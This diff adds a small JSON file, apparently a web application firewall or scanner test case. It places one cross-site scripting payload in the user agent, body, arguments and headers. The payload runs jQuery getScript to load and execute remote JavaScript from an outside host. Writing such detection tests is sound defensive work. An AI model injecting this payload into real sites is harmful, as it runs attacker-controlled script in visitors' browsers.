@@ -1,0 +1,11 @@
+{
+  "req": [
+    {
+      "Type": "ALL",
+      "UA": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "Body": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "ARGS": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+      "Headers": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}"
+    }
+  ]
+}
